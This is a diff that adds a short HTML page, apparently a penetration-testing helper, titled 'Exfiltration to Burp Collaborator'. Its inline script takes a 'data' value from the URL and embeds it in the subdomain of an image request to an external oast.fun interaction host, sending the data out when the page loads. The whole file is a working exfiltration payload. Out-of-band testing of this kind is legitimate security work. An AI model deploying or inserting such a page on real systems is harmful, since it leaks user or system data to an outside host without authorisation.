@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exfiltration to Burp Collaborator</title>
+    <script type="text/javascript">
+        // Extract the 'data' parameter from the URL
+        var params = new URLSearchParams(window.location.search);
+        var payload = params.get("data");
+
+        // Send the payload to Burp Collaborator
+        if (payload) {
+            var img = new Image();
+            // Make a request to Burp Collaborator using the payload
+            img.src = "https://" + payload + ".yqyueeqdvtgsilyleffvzzvoowz6itl52.oast.fun";  // This sends the exfiltrated data to Burp Collaborator
+        } else {
+            console.log("No payload data found.");
+        }
+    </script>
+</head>
+<body>
+    <p>Exfiltrating data to Burp Collaborator...</p>
+</body>
+</html>
